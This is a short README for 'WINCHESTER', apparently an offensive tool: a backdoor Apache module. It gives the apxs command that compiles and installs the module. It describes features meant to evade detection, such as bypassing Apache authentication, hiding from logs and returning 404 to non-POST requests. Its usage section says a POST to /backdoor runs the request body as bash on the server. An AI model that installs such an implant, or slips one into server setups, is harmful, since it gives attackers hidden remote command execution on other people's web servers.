# WINCHESTER
backdoor apache module  

``` apxs -iac mod_winchester.c ```  

## Features
- Fileless, other than module
- All non-post requests return 404
- Hooks first(ish) in the request cycle, dodging apache-based auth and configs
- Hooks own logging, hides on even the most verbose settings

## Usage
Send a post request to "/backdoor" on the webserver, apache will execute request body as bash
